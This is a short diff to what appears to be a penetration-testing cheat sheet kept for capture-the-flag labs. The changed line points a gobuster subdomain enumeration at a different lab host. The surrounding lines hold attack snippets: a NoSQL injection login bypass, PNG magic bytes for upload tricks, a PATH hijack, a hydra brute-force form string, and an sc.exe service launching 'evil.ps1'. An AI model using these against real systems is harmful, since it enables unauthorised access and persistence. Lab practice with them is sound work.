@@ -8,7 +8,7 @@ stty cols 200
 89 50 4E 47 0D 0A 1A 0A
 export PATH=/tmp:$PATH
 {"email": {"$ne": ""}, "password": {"$ne": ""}}
-gobuster vhost -w /root/Desktop/misc/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --url http://petstore.hv --append-domain
+gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt --url http://pirate.htb/ --append-domain
 http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong" 
 
 sc.exe create <new_service_name> binPath="C:\windows\temp\evil.ps1" start=auto
